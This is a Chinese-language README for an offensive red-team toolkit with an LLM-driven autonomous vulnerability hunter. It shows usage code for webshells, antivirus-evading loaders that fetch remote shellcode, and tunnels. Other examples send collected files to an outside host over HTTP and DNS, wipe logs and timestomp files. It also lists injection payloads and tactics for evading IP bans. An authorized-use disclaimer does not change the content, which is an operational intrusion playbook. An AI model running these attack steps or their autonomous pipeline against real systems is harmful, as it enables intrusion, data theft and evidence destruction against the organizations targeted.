# 红队工具集 — READMEFIRST

## 概述

本目录包含完整的红队自动化工具链，覆盖从外网突破到内网靶标的全流程。
所有模块通过 `KaliBridge` SSH 远程调用 Kali 工具，也支持本地执行。

> ⚠️ **仅限授权安全演练使用（HVV/红蓝对抗/SRC）。未经授权使用属违法行为。**

---

## 红队攻击链全景

```
┌─────────────────────────────────────────────────────────────────────┐
│                        红队攻击全流程                                 │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ① 外网突破          ② 建立据点         ③ 内网横向                  │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐               │
│  │ 信息收集  │──────→│ 漏洞利用  │──────→│ 隧道搭建  │               │
│  │ 漏洞发现  │       │ Webshell │       │ 内网扫描  │               │
│  │ 社工钓鱼  │       │ 免杀上线  │       │ 弱口令    │               │
│  └──────────┘       └──────────┘       └──────────┘               │
│                                              │                     │
│  ⑥ 痕迹清理          ⑤ 靶标达成         ④ 权限提升                  │
│  ┌──────────┐       ┌──────────┐       ┌──────────┐               │
│  │ 日志清除  │←──────│ 数据获取  │←──────│ 域控攻击  │               │
│  │ 工具清理  │       │ 截图取证  │       │ 本地提权  │               │
│  │ 时间戳    │       │ 报告生成  │       │ 凭证获取  │               │
│  └──────────┘       └──────────┘       └──────────┘               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 模块清单

### 已有模块（原有）

| 模块 | 文件 | 功能 |
|------|------|------|
| AI 引擎 | `agent_engine.py` | LLM 调用 + 命令执行 + 决策 |
| 自动挖洞 | `auto_hunt.py` | SRC 自动化漏洞挖掘主入口 |
| Kali 桥接 | `kali_bridge.py` | SSH 远程调用 Kali 渗透工具 |
| MSF 桥接 | `metasploit_bridge.py` | Metasploit RPC 集成 |
| 红队工具包 | `redteam_toolkit.py` | 横向/AD/钓鱼/凭证/C2/持久化 |
| 漏洞利用 | `exploit_engine.py` | 完整利用链验证引擎 |
| 攻击链建模 | `attack_chain.py` | 攻击路径概率排序 |
| CVE 情报 | `cve_intelligence.py` | 漏洞库自动匹配 |
| API 扫描 | `api_security_scanner.py` | GraphQL/REST/IDOR/认证绕过 |
| 云安全 | `cloud_scanner.py` | S3/Azure/GCP/K8s/Docker |
| WAF 绕过 | `waf_evasion_advanced.py` | 高级 WAF 绕过 |
| 代理轮换 | `proxy_rotator.py` | 多代理池管理 |
| 隐蔽 HTTP | `stealth_http.py` | 浏览器指纹模拟 |
| CNVD 扫描 | `cnvd_scanner.py` | 国产系统通用漏洞批量扫描 |

### 新增模块（红队补充）

| 模块 | 文件 | 功能 | 阶段 |
|------|------|------|------|
| 隧道管理 | `tunnel_manager.py` | frp/chisel/Neo-reGeorg/SSH/ICMP | ② 建立据点 |
| 内网扫描 | `intranet_scanner.py` | fscan/nmap/存活探测/高价值识别 | ③ 内网横向 |
| 免杀生成 | `av_bypass.py` | XOR/AES/Go加载器/分离加载 | ② 建立据点 |
| 提权辅助 | `privilege_escalation.py` | SUID/Potato/内核漏洞/PEASS | ④ 权限提升 |
| Webshell | `webshell_manager.py` | 多类型Shell统一管理/生成 | ② 建立据点 |
| 数据外传 | `data_exfil.py` | HTTP/DNS/ICMP/SMB 多通道 | ⑤ 靶标达成 |
| 痕迹清理 | `trace_cleaner.py` | 日志/工具/时间戳清理 | ⑥ 痕迹清理 |
| 红队报告 | `redteam_reporter.py` | HVV格式报告/得分统计 | ⑤ 靶标达成 |

---

## 前置依赖（需要安装的工具）

### 必装（Kali 上）

```bash
# 基础渗透工具
apt install -y nmap masscan nbtscan hydra crackmapexec
apt install -y impacket-scripts evil-winrm bloodhound

# Go 工具
go install github.com/shadow1ng/fscan@latest
go install github.com/jpillora/chisel@latest

# frp
wget https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_linux_amd64.tar.gz
tar -xzf frp_0.61.0_linux_amd64.tar.gz && cp frp_*/frp* /usr/local/bin/

# Neo-reGeorg
pip3 install neoreg

# 免杀编译
apt install -y mingw-w64 golang-go

# hashcat
apt install -y hashcat
```

### 选装

```bash
# Sliver C2（替代 MSF）
curl https://sliver.sh/install | sudo bash

# Donut（PE转Shellcode）
go install github.com/Binject/go-donut@latest

# pingtunnel（ICMP 隧道）
go install github.com/esrrhs/pingtunnel@latest
```

---

## 快速开始

### 1. 配置 Kali 桥接

```yaml
# config.yaml
kali:
  enabled: true
  host: "192.168.x.x"      # Kali IP
  user: "kali"
  ssh_key: "~/.ssh/id_rsa"
  timeout: 300
```

### 2. 外网突破后建立隧道

```python
from kali_bridge import KaliBridge
from tunnel_manager import TunnelManager

kb = KaliBridge(config)
tm = TunnelManager(kb)

# 方案 A：frp 反向代理（推荐）
tm.frp_deploy_server(vps_ip="1.2.3.4", bind_port=7000)
tm.frp_deploy_client(target_ip="10.0.0.5", vps_ip="1.2.3.4")
# 现在队友可通过 socks5://1.2.3.4:1080 访问内网

# 方案 B：chisel HTTP 隧道（穿防火墙）
tm.chisel_server(port=8080)
tm.chisel_client(server="1.2.3.4:8080")

# 方案 C：Neo-reGeorg（只有 webshell 时）
tm.neoregeorg_generate(password="r3dt3am")
# 上传 tunnel.jsp 到目标
tm.neoregeorg_connect("http://target.com/uploads/tunnel.jsp", "r3dt3am")
```

### 3. 内网扫描

```python
from intranet_scanner import IntranetScanner

scanner = IntranetScanner(kb, proxy="socks5://127.0.0.1:1080")

# fscan 一键扫（推荐）
result = scanner.fscan("10.0.0.0/24")
print(f"存活: {len(result['alive'])}, 漏洞: {len(result['vulns'])}")

# 或分步扫描
alive = scanner.ping_sweep("10.0.0.0/24", method="tcp")
hosts = scanner.port_scan(" ".join(alive))
hv_targets = scanner.identify_high_value(hosts)

# 弱口令爆破
scanner.brute_ssh(alive)
scanner.brute_smb(alive)
```

### 4. 免杀上线

```python
from av_bypass import AVBypass

avb = AVBypass(kb)

# Go 加载器（免杀率最高）
result = avb.gen_go_loader(lhost="1.2.3.4", lport=4444)
print(result["compile_cmd"])
print(result["steps"])

# 分离加载（shellcode 放 VPS）
result = avb.gen_remote_loader(shellcode_url="http://1.2.3.4/sc.bin")
```

### 5. 提权

```python
from privilege_escalation import PrivEsc

pe = PrivEsc(kb)

# Linux 提权枚举
vectors = pe.enum_linux()
suggestions = pe.enum_linux_quick()

# Windows Potato 提权
pe.potato("10.0.0.5", "user", "pass", method="god")

# 内核漏洞匹配
pe.kernel_exploit("5.4.0-42-generic")
```

### 6. Webshell 管理

```python
from webshell_manager import WebshellManager

wm = WebshellManager(kb)

# 生成 shell
php_shell = wm.generate_php(password="x", obfuscate=True)
jsp_shell = wm.generate_jsp(password="x")

# 添加已上传的 shell
wm.add_shell("http://target.com/uploads/x.php", "php_system", "x")

# 执行命令
wm.exec_cmd(0, "whoami")
wm.exec_cmd(0, "cat /etc/passwd")

# 文件操作
wm.list_dir(0, "/var/www/html")
```

### 7. 数据外传

```python
from data_exfil import DataExfil

de = DataExfil(kb)

# 收集敏感文件
de.collect_linux()

# 加密打包
de.pack_encrypt("/tmp/.loot", password="r3dt3am2026")

# 外传
de.exfil_http("/tmp/.loot.enc", "http://1.2.3.4:8080/upload")

# 隐蔽通道（DNS）
de.exfil_dns("/tmp/.loot.enc", "data.your-vps.com")
```

### 8. 痕迹清理

```python
from trace_cleaner import TraceCleaner

tc = TraceCleaner(kb)

# 标准清理
tc.clean_linux(level="standard")
tc.clean_windows("10.0.0.5", "admin", "pass")

# 选择性删除（只删自己 IP 的记录）
tc.clean_linux_selective(ip_to_remove="1.2.3.4")

# 清理上传的工具
tc.clean_tools()

# 时间戳伪造
tc.timestomp("/var/www/html/shell.php")
```

### 9. 生成报告

```python
from redteam_reporter import RedTeamReporter

rr = RedTeamReporter(team_name="Alpha", engagement="2026-HVV")

# 记录攻击路径
rr.add_path_step("FOFA 发现目标", "x.x.x.x:8080", "发现泛微OA", tools=["FOFA"])
rr.add_path_step("SQL注入获取shell", "x.x.x.x", "获得webshell", tools=["sqlmap"])
rr.add_path_step("frp建立隧道", "内网", "socks5代理建立", tools=["frp"])
rr.add_path_step("fscan内网扫描", "10.0.0.0/24", "发现DC", tools=["fscan"])
rr.add_path_step("DCSync获取域管", "DC01", "拿到域管hash", tools=["impacket"])

# 添加发现
rr.add_finding("泛微OA SQL注入", "外网突破", "critical", "x.x.x.x", "WorkPlanService SQL注入")
rr.add_finding("域控权限获取", "域控", "critical", "DC01", "DCSync获取域管NTLM")

# 生成报告
report = rr.generate(format="markdown")
rr.save("/tmp/redteam_report.md")
print(f"总得分: {rr.calculate_score()['total']}")
```

---

## 典型红队流程（速查）

```
1. FOFA/Hunter 搜目标资产         → cnvd_scanner.py / auto_hunt.py
2. 发现漏洞拿到入口                → exploit_engine.py / metasploit_bridge.py
3. 上传 webshell                   → webshell_manager.py
4. 免杀 payload 上线 C2            → av_bypass.py
5. 搭建隧道让队友进来              → tunnel_manager.py
6. 内网扫描找高价值目标            → intranet_scanner.py
7. 横向移动（PTH/PTT/WMI）        → redteam_toolkit.py
8. 提权拿到域控/SYSTEM             → privilege_escalation.py
9. 获取靶标数据                    → data_exfil.py
10. 截图取证 + 报告                → redteam_reporter.py
11. 痕迹清理                       → trace_cleaner.py
```

---

## 注意事项

1. **合法授权** — 所有操作必须在授权范围内进行
2. **最小影响** — 不破坏目标业务，不删除生产数据
3. **证据留存** — 每一步操作都要截图/录屏留证
4. **限速控制** — config.yaml 中的 rate_limit 必须遵守
5. **即时沟通** — 拿到重要权限第一时间通知队长
6. **数据安全** — 获取的数据加密存储，演练后销毁

---

## 参考项目

| 项目 | 用途 | 地址 |
|------|------|------|
| fscan | 内网综合扫描 | github.com/shadow1ng/fscan |
| frp | 反向代理隧道 | github.com/fatedier/frp |
| chisel | HTTP 隧道 | github.com/jpillora/chisel |
| Neo-reGeorg | Web 隧道 | github.com/L-codes/Neo-reGeorg |
| PEASS-ng | 提权检查 | github.com/peass-ng/PEASS-ng |
| Sliver | C2 框架 | github.com/BishopFox/sliver |
| CrackMapExec | AD/SMB 利用 | github.com/byt3bl33d3r/CrackMapExec |
| BloodHound | AD 路径分析 | github.com/BloodHoundAD/BloodHound |
| Impacket | Windows 协议工具 | github.com/fortra/impacket |
| RedTeam-Tools | 红队工具大全 | github.com/A-poc/RedTeam-Tools |



---

## SRC/赏金自动化挖掘（auto_hunt.py）

> 这是本工具的核心功能 — AI 驱动的全自动 SRC 漏洞挖掘。

### 快速开始（挖 SRC）

```bash
# 1. 安装依赖
pip install -r requirements.txt

# 2. 配置
cp config.yaml.example config.yaml
# 填入 LLM API Key（DeepSeek/OpenAI）
# 填入目标域名、Cookie（如果要测登录态接口）

# 3. 一键开挖
python auto_hunt.py --target example.com --mode auto

# 4. 半自动模式（每步确认）
python auto_hunt.py --target example.com --mode semi
```

### 10 阶段流水线

```
┌────────────────────────────────────────────────────────────────────────────┐
│                         SRC 自动化挖掘流水线                                │
├────────────────────────────────────────────────────────────────────────────┤
│                                                                            │
│  ① Recon           ② Params          ③ ExtendedScan                       │
│  ┌──────────┐     ┌──────────┐     ┌──────────────┐                       │
│  │subfinder │     │ParamSpider│     │子域名接管验证 │                       │
│  │assetfinder│     │gf 6模式  │     │S3/Azure枚举  │                       │
│  │katana爬虫│     │GraphQL发现│     │SPA浏览器爬虫  │                       │
│  │JS密钥提取│     │arjun探测  │     │JS深度分析    │                       │
│  │tech指纹  │     │JSON字段   │     │CVE情报匹配   │                       │
│  └──────────┘     └──────────┘     │OOB回调准备   │                       │
│       │                │            └──────────────┘                       │
│       ▼                ▼                   │                               │
│  ④ Hunt            ⑤ Chain           ⑥ CriticalHunt                       │
│  ┌──────────┐     ┌──────────┐     ┌──────────────┐                       │
│  │nuclei扫描│     │9条组链规则│     │SSTI/命令注入  │                       │
│  │XSS(dalfox)│    │A→B→C自动 │     │SQLi深度(盲注) │                       │
│  │CORS+cred │     │AI辅助链  │     │密码重置接管   │                       │
│  │SSRF检测  │     │           │     │0元购/负数金额 │                       │
│  │JWT审计   │     │           │     │垂直越权      │                       │
│  │开放重定向│     │           │     │批量数据泄露   │                       │
│  │竞态/IDOR │     │           │     │OTP暴破       │                       │
│  └──────────┘     └──────────┘     └──────────────┘                       │
│       │                │                   │                               │
│       ▼                ▼                   ▼                               │
│  ⑦ DeepHunt        ⑧ Validate        ⑨ Verify         ⑩ Report           │
│  ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐         │
│  │httpx Fuzz│     │7问门控   │     │四证齐全   │     │SRC格式   │         │
│  │IDOR系统性│     │真假判定   │     │代码路径   │     │H1/补天   │         │
│  │业务逻辑  │     │           │     │运行时证明 │     │自动生成   │         │
│  │403绕过   │     │           │     │反证检查   │     │           │         │
│  └──────────┘     └──────────┘     └──────────┘     └──────────┘         │
│                                                                            │
└────────────────────────────────────────────────────────────────────────────┘
```

### 各阶段详解

#### ① Recon（信息搜集）
- **subfinder + assetfinder** — 多源子域名枚举
- **httpx -tech-detect** — 存活探测 + 技术栈指纹
- **katana** — 主动爬虫，能渲染 JS（SPA 应用必备）
- **gau + waybackurls** — 历史 URL 收集（500+）
- **JS 文件提取** — 从 JS bundle 中 grep API 端点和硬编码密钥

#### ② Params（参数发现）
- **ParamSpider** — 被动参数发现
- **gf** — 6 种漏洞模式匹配（xss/ssrf/sqli/redirect/idor/lfi）
- **GraphQL 端点发现** — 7 种路径探测 + introspection
- **arjun** — GET/POST 双模式主动参数探测
- **JSON body 字段** — 从 API 响应中提取可注入字段名

#### ③ ExtendedScan（扩展扫描）
- **子域名接管** — CNAME 悬挂 + 多云服务商指纹匹配
- **S3/Azure/GCP Bucket** — 14 种命名模式枚举 + 可列目录检测
- **Playwright SPA 爬虫** — 拦截 XHR/Fetch 发现隐藏 API
- **JS 深度分析** — 端点/密钥/DOM XSS Sink 全量提取
- **CVE 情报匹配** — 根据技术栈自动关联已知漏洞
- **Interactsh OOB** — 为后续盲测试准备带外回调域名

#### ④ Hunt（漏洞挖掘）
- **Nuclei** — 高中危模板扫描
- **XSS** — dalfox 自动检测
- **CORS** — 带 credentials 测试
- **SSRF** — 云 metadata + 内网 IP 绕过（6 种）
- **JWT** — alg:none / HS256 弱密钥 / kid 注入
- **SQLi** — error-based 快速探测 + 时间盲注验证（**不用 sqlmap**）
- **开放重定向** — 6 种绕过 payload
- **子域名接管验证** — CNAME 确认
- **竞态条件** — AI 筛选写操作接口 + 并发测试
- **IDOR** — 双账号响应体 hash 对比

#### ⑤ Chain（自动组链）
把多个低危组合成高危：
| 链 | 组合 | 级别 |
|---|---|---|
| Open Redirect → OAuth → ATO | 重定向 + OAuth redirect_uri | Critical |
| SSRF → Cloud Metadata → RCE | SSRF + IAM credential | Critical |
| XSS → Cookie Theft → ATO | XSS + 无 HttpOnly | Critical |
| CORS + Credentials → Data Theft | CORS reflect + credentials | High |
| IDOR Read → Write/Delete | 读越权 → PUT/PATCH/DELETE | Critical |
| GraphQL Introspection → PII | schema + 敏感字段 | High |
| JWT Weak → Admin Forge | alg:none/弱密钥 → 伪造 | Critical |
| Subdomain Takeover → Session | 接管 + cookie scope | High |
| Secret Leak → Access | 密钥 → 验证可用性 | High |

#### ⑥ CriticalHunt（高危专项）
- **SSTI** — 6 种模板引擎 payload（{{7*7}}, ${7*7}, <%=7*7%>...）
- **命令注入** — ;id / |id / $(id) / 反引号 / %0a / ||
- **文件上传** — 10 种上传路径探测
- **SQLi POST JSON** — API JSON body 注入（WAF 通常不查）
- **SQLi Cookie** — Cookie 参数注入（90% WAF 不管）
- **密码重置 Host 注入** — 重置链接发到攻击者域名
- **重置 Token 泄露** — 响应中直接暴露 token
- **OTP 无限速** — 验证码接口暴力枚举
- **0 元购** — price=0 / amount=-1
- **POST 金额篡改** — AI 识别下单接口
- **垂直越权** — 普通 cookie 打 16 种 admin 路径
- **批量数据泄露** — page_size=10000 无限制

#### ⑦ DeepHunt（深度挖掘）
- 自研 httpx 异步引擎做精细化 Fuzz
- 响应差异检测（基线对比）
- 系统性 IDOR 测试（ID 遍历 + 方法切换）
- 业务逻辑竞态（真实状态对比）
- 403 绕过（Header 变异）

#### ⑧⑨⑩ Validate → Verify → Report
- **7 问门控** — 确认漏洞真实可利用
- **四证齐全** — 代码路径/运行时/证据/反证
- **自动生成报告** — 适配 HackerOne / 补天 / 漏洞盒子格式

---

### 防封 IP 策略

```yaml
# config.yaml 限速配置
rate_limit:
  requests_per_second: 2      # 默认 2 req/s（安全值）
  max_concurrent: 2
  delay_between_phases: 3     # 每步基础延迟 3s
  max_total_requests: 500     # 单次最大请求数
```

**内置防封机制：**
- 每个请求额外 0.3~1.5s **随机抖动**（防固定间隔指纹）
- 每步之间 3~5.5s **随机间隔**（不是固定值）
- WAF 检测到后**自动降速**（wafw00f 识别 → 调整策略）
- **sqlmap 完全禁用** — 用手动时间盲注替代（单请求验证）
- nuclei 带 `-rate-limit 5 -c 3`
- httpx 带 `-rate-limit 10`
- 连续 5 个 403 → 自动停止（红线机制）
- IP 被封检测 → 自动暂停

---

### config.yaml 关键配置

```yaml
# LLM（必填）
llm:
  api_key: "sk-你的Key"
  base_url: "https://api.deepseek.com/v1"
  model: "deepseek-chat"

# 目标（必填）
target:
  domain: "example.com"
  bounty_platform: "cn_src"  # hackerone / cn_src

# IDOR 双账号（推荐）
idor:
  cookie_a: "session=账号A的cookie"
  cookie_b: "session=账号B的cookie"

# Session 监控（推荐）
session_monitor:
  cookie: "你的登录cookie"
  check_url: "https://example.com/api/me"
  check_interval: 10

# 深度挖掘
deep_hunt:
  enable_fuzz: true
  enable_idor: true
  enable_bizlogic: true
  enable_auth_bypass: true

# 浏览器爬虫（可选）
browser_crawler:
  enabled: true
  max_depth: 3
  timeout: 30000
```

---

### 前置工具安装（SRC 挖洞用）

```bash
# ═══ 必装（Go 工具）═══
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/tomnomnom/gf@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/hahwul/dalfox/v2@latest
go install github.com/tomnomnom/anew@latest

# ═══ 必装（Python 工具）═══
pip install paramspider arjun trufflehog

# ═══ 推荐（OOB 回调）═══
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# ═══ 推荐（SPA 爬虫）═══
pip install playwright && playwright install chromium

# ═══ gf patterns（漏洞模式匹配）═══
mkdir -p ~/.gf
git clone https://github.com/1ndianl33t/Gf-Patterns ~/.gf
```

---

### 使用示例

#### 最简用法（全自动）
```bash
export DEEPSEEK_API_KEY=sk-xxx
python auto_hunt.py --target example.com --mode auto
```

#### 带 Cookie 测登录态（推荐）
```yaml
# config.yaml
session_monitor:
  cookie: "JSESSIONID=abc123; token=xyz"
  check_url: "https://example.com/api/user/info"
idor:
  cookie_a: "session=用户A"
  cookie_b: "session=用户B"
```
```bash
python auto_hunt.py --target example.com --mode auto
```

#### 国内 SRC（补天/漏洞盒子）
```yaml
target:
  domain: "xxx.com"
  bounty_platform: "cn_src"  # 使用国内 SRC 过滤规则（更宽松）
```

#### APP 类目标
```yaml
target:
  domain: "com.example.app"  # 包名
app:
  apk_path: "/path/to/app.apk"
  har_path: "/path/to/traffic.har"
```

---

### 输出文件

```
~/Desktop/doing_2026-05-31.md    ← 实时操作日志
~/.bai-agent/leads/              ← 线索收集
~/.bai-agent/checkpoints/        ← 断点（可恢复）
~/.bai-agent/experience/         ← 经验库（已禁用自动学习）
```

---

### 常见问题

**Q: 跑一半被封了怎么办？**
A: 工具会自动检测（连续 403/触发验证码）并暂停。恢复方法：
1. 换 IP（代理/VPN）
2. 降低 `requests_per_second` 到 1
3. 重新运行，自动从断点恢复

**Q: 怎么提高出洞率？**
A: 
1. 一定要配双账号（IDOR 是出洞率最高的类型）
2. 配 session cookie（很多漏洞在登录态才能测到）
3. 用 `cn_src` 平台模式（国内规则更宽松）
4. 跑完看线索文件（`~/.bai-agent/leads/`），手动深挖 AI 标记的高价值线索

**Q: 不想跑全部阶段？**
A: 用半自动模式 `--mode semi`，每个阶段前会问你是否跳过。

**Q: 支持哪些 LLM？**
A: DeepSeek（默认）/ OpenAI / 任何 OpenAI 兼容接口。设置环境变量：
```bash
export DEEPSEEK_API_KEY=sk-xxx        # DeepSeek
# 或
export OPENAI_API_KEY=sk-xxx          # OpenAI
export LLM_BASE_URL=https://xxx/v1    # 自定义接口
export LLM_MODEL=gpt-4o               # 自定义模型
```
